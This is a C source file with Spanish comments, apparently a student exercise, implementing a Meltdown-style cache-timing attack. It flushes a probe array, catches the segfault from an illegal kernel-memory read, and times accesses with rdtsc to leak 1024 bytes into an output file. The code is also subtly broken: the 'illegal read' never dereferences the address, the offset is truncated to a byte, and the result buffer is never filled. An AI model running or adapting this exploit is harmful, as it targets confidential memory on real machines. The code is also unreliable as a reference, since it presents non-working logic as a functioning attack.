#define TH 4
#include <stdio.h>
#include <emmintrin.h> // para _mm_clflush
#include <x86intrin.h> // para rdtsc
#include <stdint.h>
#include <signal.h> // para el sigseg
#include <setjmp.h> //para el jump

static jmp_buf buf; // bufer usado para despues poder volver a la ejecución

// funcion usada para tratal la señal
static void unblock_signal(int signum __attribute__((__unused__)))
{
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void sigsegv_handler(int signum)
{
	(void)signum;
	unblock_signal(SIGSEGV);
	longjmp(buf, 1);
}
/*
//funcion que realiza el ataque.
input:
	direccion desde la que se va a empezar a leer
	numero de B a leer
	Vector donde guardar el resultado

*/
void ataque(int address, int nBytsLeer, uint8_t *resultado)
{
	uint8_t probe_array[256 * 4096];			  // instanciamos el probe_array
	signal(SIGSEGV, sigsegv_handler);			  // señalamos cual sera la funcion que se llamara cuando se de el SIGFAULT
	uint8_t *auxi = (uint8_t *)malloc(nBytsLeer); // creamos sitio para el resultado

	for (int j = 0; j < nBytsLeer - 1; j++) // por cada bit que se quiera leer...
	{
		// hacemos un flush del array probe para asegurarnos que esta vacio, y tomar bien las medidas de tiempo
		for (int i = 0; i < 256; i++)
		{
			_mm_clflush(&probe_array[i * 4096]);
		}
		_mm_mfence(); // Asegurarse de que todas las intstrucciones se han terminado de ejecutar para cuando empieza la siguiente

		if (!setjmp(buf))
		{												 // para poder volver despues del segfault
			int value = address;						 // lectura ilegal
			uint8_t offset = value * 4096;				 // valor * 4096
			volatile uint8_t temp = probe_array[offset]; // acceso basandonos en esa lectura
		}
		// he decidido quedarme con el acceso que mas tarde, en vez de usar un treshold
		int max = 0;
		int finalI;
		for (int i = 0; i < 256; i++) // por cada pagina
		{
			int t1 = _rdtsc();				   // tomar primera medida de tiempo
			int dummy = probe_array[i * 4096]; // acceso
			int t2 = _rdtsc() - t1;			   // segunda medida de tiempo
			if (t2 > max)					   // si es que mas ha tardado, sustitulle al maximo
			{
				max = t2;
				finalI = i;
			}
		}
		printf("iteracion:%i, valor escrito%i\n", j, finalI);
		auxi[j] = finalI; // guardamos el valor que mas haya tardado
		auxi++;
		address++; // actualizamos la posicion a leer la siguiente direccion
	}
}

int main(int argc, char *argv[])
{
	if (argc < 2)
	{
		fprintf(stderr, "Uso: %s <nombre_archivo_salida>\n", argv[0]);
		return 1;
	}

	const char *nombre_archivo = argv[1];
	// abrimos el archibo:
	FILE *archivo = fopen(nombre_archivo, "w");
	if (!archivo)
	{
		perror("Error al abrir el archivo");
		return 1;
	}
	uint8_t resultado[1024];
	ataque(0, 1024, resultado);

	// escribimos el resultado
	for (int i = 0; i < 1024 - 1; i++)
	{
		fprintf(archivo, "%c", resultado[i]);
	}

	// cerramos el archivo
	fclose(archivo);
	printf("Resultado escrito en '%s'\n", nombre_archivo);
	return 0;
}